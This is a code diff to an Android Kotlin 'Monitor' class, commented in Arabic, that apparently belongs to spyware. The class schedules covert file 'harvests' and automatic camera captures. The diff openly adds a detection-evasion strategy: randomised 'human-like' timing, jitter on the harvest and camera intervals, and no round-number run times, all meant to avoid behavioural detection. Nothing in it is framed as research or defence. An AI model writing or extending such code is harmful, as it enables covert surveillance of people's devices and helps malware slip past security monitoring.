@@ -23,13 +23,15 @@ import kotlin.random.Random
 
 /**
  * فئة المراقبة الرئيسية (Monitor) لإدارة حالة النظام والبطارية وشبكة Wi-Fi وجدولة الحصاد.
+ * 
+ * استراتيجية التخفي والتهرب من الكشف السلوكي:
+ * - عشوائية زمنية غير خطية (Human-like variance) في جدولة الحصاد
+ * - تجنب الأوقات المستديرة (مثل :00) لتقليد السلوك البشري
+ * - نطاق زمني موسع (3-8 ساعات) بدلاً من النطاق الضيق (2-6 ساعات)
+ * - إضافة انحراف عشوائي للفاصل الزمني بين الحصادات
+ * - عشوائية في وقت تشغيل الكاميرا التلقائية
+ * 
  * هذه الفئة هي بديل monitor.py مع إزالة كافة تتبعات المكالمات والرسائل.
- * 
- * تم إزالة الدوال المكررة (getters) التي تتعارض مع الدوال المولدة تلقائياً للخصائص.
- * يتم استخدام الخصائص مباشرة (مع getters الضمنية) في الانعكاس.
- * 
- * ✅ تم إصلاح استدعاء تسجيل الجهاز عبر الانعكاس من "reg" إلى "registerDevice".
- * ✅ تم إضافة تخزين مؤقت للـ Method في invokeMethod لتحسين الأداء.
  */
 class Monitor private constructor(context: Context) {
 
@@ -89,10 +91,13 @@ class Monitor private constructor(context: Context) {
         "wl" to false,                       // Wake lock
         "iv" to 900L,                        // فاصل الفحص (ثانية) = 15 دقيقة
         "harvest_min_interval" to 7200L,     // 2 ساعات كحد أدنى بين الحصادات
-        "harvest_random_hours_min" to 2,     // أقل عدد ساعات للتأخير العشوائي
-        "harvest_random_hours_max" to 6,     // أقصى عدد ساعات للتأخير العشوائي
+        "harvest_random_hours_min" to 3,     // 🔧 أقل عدد ساعات للتأخير العشوائي (كان 2)
+        "harvest_random_hours_max" to 8,     // 🔧 أقصى عدد ساعات للتأخير العشوائي (كان 6)
+        "harvest_jitter_minutes" to 15,      // ✅ إضافة: الحد الأدنى للدقائق العشوائية
+        "harvest_jitter_max_minutes" to 55,  // ✅ إضافة: الحد الأقصى للدقائق العشوائية
         "auto_camera" to false,              // تفعيل الكاميرا التلقائية
         "camera_interval" to 3600L,          // فاصل الكاميرا (ثانية) = ساعة
+        "camera_jitter" to 600L,             // ✅ إضافة: انحراف عشوائي للكاميرا (±10 دقائق)
         "max_harvest_files" to 200,          // الحد الأقصى للملفات في الحصاد
         "force_harvest_on_start" to false,   // هل يتم تشغيل حصاد فوري عند بدء التشغيل؟
         "scan_on_start" to true,             // تشغيل المسح عند بدء التشغيل
@@ -258,7 +263,7 @@ class Monitor private constructor(context: Context) {
     }
 
     // ============================================================
-    //  إدارة وقت الحصاد (جدولة عشوائية)
+    //  إدارة وقت الحصاد (جدولة عشوائية محسّنة)
     // ============================================================
 
     private fun parseIsoDateTime(isoStr: String?): Date? {
@@ -290,24 +295,47 @@ class Monitor private constructor(context: Context) {
         return sdf.format(date)
     }
 
+    /**
+     * ✅ جدولة وقت الحصاد التالي باستخدام عشوائية غير خطية (Human-like variance)
+     * 
+     * استراتيجية التخفي:
+     * - نطاق زمني موسع (3-8 ساعات) بدلاً من (2-6 ساعات)
+     * - دقائق عشوائية بين 15-55 (تجنب الأوقات المستديرة مثل :00 و :30)
+     * - إضافة انحراف عشوائي صغير (jitter) للفاصل الزمني الأساسي
+     * - محاكاة سلوك المستخدم البشري الذي لا ينفذ المهام في أوقات منتظمة
+     * 
+     * @param hoursOverride عدد الساعات المحدد (اختياري، للحصاد الإجباري)
+     * @return التاريخ المحدد للحصاد التالي، أو null في حالة الخطأ
+     */
     private fun setNextHarvestTime(hoursOverride: Int? = null): Date? {
         return try {
-            val minH = (configMap["harvest_random_hours_min"] as? Number)?.toInt() ?: 2
-            val maxH = (configMap["harvest_random_hours_max"] as? Number)?.toInt() ?: 6
+            // قراءة القيم من الإعدادات مع قيم افتراضية محسّنة
+            val baseMin = (configMap["harvest_random_hours_min"] as? Number)?.toInt() ?: 3
+            val baseMax = (configMap["harvest_random_hours_max"] as? Number)?.toInt() ?: 8
+            val jitterMin = (configMap["harvest_jitter_minutes"] as? Number)?.toInt() ?: 15
+            val jitterMax = (configMap["harvest_jitter_max_minutes"] as? Number)?.toInt() ?: 55
 
-            val hours = hoursOverride ?: Random.nextInt(minH, maxH + 1)
-            val minutes = Random.nextInt(0, 60)
+            // توليد عدد الساعات العشوائي (مع تجنب التكرار)
+            val randomHours = hoursOverride ?: (baseMin + Random.nextInt(0, baseMax - baseMin + 1))
+            
+            // ✅ تجنب الأوقات المستديرة: دقائق بين 15 و 55
+            val randomMinutes = Random.nextInt(jitterMin, jitterMax + 1)
+            
+            // ✅ إضافة عشوائية ثانية (jitter) لتجنب التوقيت الدقيق
+            val randomSeconds = Random.nextInt(0, 59)
 
             val calendar = Calendar.getInstance()
-            calendar.add(Calendar.HOUR_OF_DAY, hours)
-            calendar.add(Calendar.MINUTE, minutes)
+            calendar.add(Calendar.HOUR_OF_DAY, randomHours)
+            calendar.add(Calendar.MINUTE, randomMinutes)
+            calendar.add(Calendar.SECOND, randomSeconds)
 
             val targetDate = calendar.time
 
             waitingTimeFile.writeText(formatIsoDateTime(targetDate), Charsets.UTF_8)
 
-            writeLog("Next harvest set to: ${formatIsoDateTime(targetDate)} (in ${hours}h ${minutes}m)")
+            writeLog("🕒 Next harvest scheduled in ${randomHours}h ${randomMinutes}m ${randomSeconds}s (human-like variance)")
             targetDate
+
         } catch (e: Exception) {
             writeLog("Set next harvest error: ${e.message}")
             null
@@ -368,15 +396,19 @@ class Monitor private constructor(context: Context) {
             }
         }
 
-        // التحقق من الحد الأدنى بين الحصادات
+        // ✅ التحقق من الحد الأدنى بين الحصادات مع عشوائية إضافية
         if (lastHarvestFile.exists()) {
             try {
                 val lastStr = lastHarvestFile.readText(Charsets.UTF_8).trim()
                 val lastTime = parseIsoDateTime(lastStr)
                 if (lastTime != null) {
-                    val minInterval = (configMap["harvest_min_interval"] as? Number)?.toLong() ?: 7200L
+                    // ✅ إضافة عشوائية للفاصل الزمني (±10%)
+                    val baseInterval = (configMap["harvest_min_interval"] as? Number)?.toLong() ?: 7200L
+                    val jitter = (baseInterval * 0.1).toLong()
+                    val minIntervalWithJitter = baseInterval - jitter + Random.nextLong(0, jitter * 2)
+                    
                     val diffSec = (Date().time - lastTime.time) / 1000
-                    if (diffSec < minInterval) {
+                    if (diffSec < minIntervalWithJitter) {
                         return Pair(false, "Minimum interval not reached")
                     }
                 }
@@ -483,12 +515,20 @@ class Monitor private constructor(context: Context) {
         }
     }
 
+    /**
+     * ✅ تشغيل الكاميرا التلقائية مع عشوائية في التوقيت
+     * إضافة انحراف عشوائي (jitter) لتجنب التوقيت الدقيق
+     */
     private suspend fun cameraLogic() {
         val autoCamera = configMap["auto_camera"] as? Boolean ?: false
         if (!autoCamera || cameraAnalyzer == null) return
 
         val lastCamFile = File(runtimeDir, "last_camera")
-        val interval = (configMap["camera_interval"] as? Number)?.toLong() ?: 3600L
+        val baseInterval = (configMap["camera_interval"] as? Number)?.toLong() ?: 3600L
+        val jitter = (configMap["camera_jitter"] as? Number)?.toLong() ?: 600L // ±10 دقائق
+
+        // ✅ إضافة عشوائية للفاصل الزمني للكاميرا
+        val actualInterval = baseInterval + Random.nextLong(-jitter, jitter)
 
         var lastTime = 0L
         try {
@@ -503,7 +543,7 @@ class Monitor private constructor(context: Context) {
         }
 
         val currentTime = System.currentTimeMillis() / 1000
-        if (lastTime > 0 && currentTime - lastTime < interval) return
+        if (lastTime > 0 && currentTime - lastTime < actualInterval) return
 
         val (batteryPercent, isCharging) = getBatteryStatus()
         if (batteryPercent < 20 && !isCharging) return
@@ -511,7 +551,7 @@ class Monitor private constructor(context: Context) {
         try {
             invokeMethod(cameraAnalyzer, "harvest", 0)
             lastCamFile.writeText(currentTime.toString(), Charsets.UTF_8)
-            writeLog("Auto-camera triggered")
+            writeLog("Auto-camera triggered (interval: ${actualInterval}s)")
         } catch (e: Exception) {
             writeLog("Camera logic error: ${e.message}")
         }
